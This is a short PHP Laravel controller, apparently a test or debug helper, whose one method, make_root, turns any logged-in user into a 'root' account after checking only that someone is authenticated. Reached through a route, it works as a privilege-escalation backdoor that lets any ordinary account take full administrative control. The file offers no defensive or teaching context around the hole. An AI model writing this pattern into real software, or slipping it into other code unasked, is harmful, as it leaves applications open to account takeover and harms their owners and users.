<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class TestController extends Controller
{
    public function make_root()
    {
        if (!Auth::check()) return 'go away';

        $user = Auth::user();
        $user->type = 'root';
        $user->save();

        return 'ok, buddy';
    }
}
